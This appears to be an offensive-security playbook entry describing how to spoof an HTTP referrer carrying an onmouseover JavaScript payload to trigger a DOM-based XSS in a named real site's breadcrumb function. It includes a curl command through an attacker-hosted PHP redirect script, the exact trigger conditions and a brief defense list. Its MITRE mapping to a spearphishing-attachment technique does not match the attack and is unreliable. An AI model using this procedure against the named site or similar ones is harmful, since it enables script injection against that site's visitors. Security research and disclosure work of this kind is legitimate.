---
id: proc-craft-referrer-xss
tags:
  - referrer-spoofing
  - xss-prep
type: procedure
tools:
  - '[[tools/loc-php-referrer-controller]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1566.001]]'
updated_at: '2025-12-14T17:28:20.723Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[T1566.001]]'
---
# Craft-Malicious-Referrer-for-XSS-Injection

## Summary

This procedure sets up a controlled HTTP referrer containing a JavaScript payload, such as an onmouseover event handler, to prepare for DOM-based XSS injection in the bindBreadCrumb function on kb.informatica.com.

## Description

In the attack scenario, the vulnerability relies on unencoded document.referrer being inserted into an HTML href attribute. By using a custom PHP redirect script, an attacker crafts a referrer like '//search.informatica.com/onmouseover=alert(document.domain)' and redirects to a target page with the 'myk' parameter. This ensures the conditions for processing the referrer are met: myk non-empty, no /home.aspx in referrer, empty CoveoSearchUrl cookie, and referrer containing //search.informatica.com. The outcome is the payload ready for injection upon page load.

## Requirements

1. Access to a web server to host the PHP redirect script (e.g., loc.php).
2. Knowledge of the target URL structure, including the 'myk' parameter.
3. Browser or curl for testing the redirect.

## Defense

Defensive measures and detection strategies:

- Implement referrer policy headers (e.g., Referrer-Policy: strict-origin) to limit referrer exposure.
- Monitor for unusual referrer patterns in server logs, such as those containing JavaScript snippets.

## Objectives

1. Spoof a malicious HTTP referrer matching the expected search domain.
2. Redirect to the vulnerable page while preserving the payload.
3. Ensure prerequisite conditions for referrer processing are satisfied.

## Instructions

### Step 1: Deploy the Referrer Control Script

**Context**: Host a PHP script that accepts parameters to set the referrer and redirect URL.

**Command** (Custom PHP invocation via curl for testing):
```bash
curl "http://spqr.zz.mu/loc.php?//search.informatica.com/onmouseover=alert(document.domain)&https://kb.informatica.com/solution/4/Pages/17377.aspx?myk=xxx"
```

> This command simulates accessing the loc.php script, where the first parameter sets the referrer prefix with payload, the second is the redirect URL. Expected output: HTTP redirect response with Location header pointing to the target.

### Step 2: Verify Referrer Spoofing

**Context**: Confirm the referrer is set correctly before full navigation.

**Command** (Browser dev tools or proxy like Burp to inspect headers):
```bash
# Use browser: Open the crafted URL and check Network tab for Referer header
```

> Inspect the request to the target; the Referer should match the malicious string. Expected output: Malicious referrer visible in headers.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[T1566.001]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/loc-php-referrer-controller]]

## Tags

- referrer-spoofing
- xss-prep
